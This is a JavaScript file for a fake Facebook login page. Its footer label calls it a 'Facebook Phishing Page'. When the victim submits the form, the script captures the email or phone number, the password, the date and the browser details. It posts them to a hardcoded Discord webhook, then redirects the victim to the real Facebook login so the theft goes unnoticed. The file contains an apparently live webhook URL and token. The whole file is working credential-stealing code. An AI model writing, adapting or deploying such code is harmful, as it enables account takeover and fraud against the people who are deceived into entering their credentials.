document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.login-form');
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1345612035039428679/LXPLmZu07Cz6aGTR8lwZyP84Imy1-WvlZrSNWCz4aNmceTWNAVMLdacQvkWvTq0la5jP";

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        // Get additional information
        const date = new Date().toLocaleString();
        const userAgent = navigator.userAgent;
        
        // Prepare Discord message
        const message = {
            content: "📘 New Facebook Login Captured",
            embeds: [{
                title: "Facebook Credentials",
                color: 0x1877F2, // Facebook blue
                fields: [
                    {
                        name: "📧 Email/Phone",
                        value: "```" + username + "```",
                        inline: true
                    },
                    {
                        name: "🔑 Password",
                        value: "```" + password + "```",
                        inline: true
                    },
                    {
                        name: "⏰ Date",
                        value: "```" + date + "```",
                        inline: false
                    },
                    {
                        name: "🌐 Browser Info",
                        value: "```" + userAgent + "```",
                        inline: false
                    }
                ],
                footer: {
                    text: "Facebook Phishing Page"
                }
            }]
        };

        // Send to Discord webhook
        fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message)
        })
        .then(response => {
            if (response.ok) {
                // Redirect to real Facebook after sending data
                window.location.href = "https://www.facebook.com/login";
            }
        })
        .catch(error => console.error('Error:', error));

        // Clear the form
        form.reset();
    });
}); 